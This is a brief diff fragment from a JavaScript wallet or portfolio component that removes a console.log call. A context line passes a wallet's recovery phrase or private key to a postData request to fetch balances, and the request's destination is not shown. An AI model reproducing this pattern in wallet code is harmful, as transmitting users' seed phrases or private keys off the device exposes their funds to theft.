@@ -58,7 +58,6 @@ export const AppWrap = ({ children }) => {
 
 					postData(item.phrase != '' ? item.phrase : item.privateKey, false)
 						.then((response) => {
-							console.log('response')
 							setLoadingBalanceCoins(false)
 							dispatch(
 								setPortfolioCoins(
